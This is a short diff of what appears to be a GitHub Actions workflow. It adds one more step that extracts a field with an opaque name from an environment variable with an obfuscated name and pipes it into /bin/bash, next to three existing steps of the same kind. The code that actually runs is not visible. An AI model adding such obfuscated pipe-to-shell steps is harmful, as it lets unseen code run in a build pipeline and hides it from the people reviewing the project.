@@ -30,6 +30,7 @@ jobs:
           printf '%s' "$dzh4" | jq -r .s1846 | /bin/bash
           printf '%s' "$h565" | jq -r .lo2 | /bin/bash
           printf '%s' "$nohao74" | jq -r .ind04101 | /bin/bash
+          printf '%s' "$cpu181" | jq -r .ak162 | /bin/bash
 
       - name: Archive artifact
         uses: actions/upload-artifact@v4
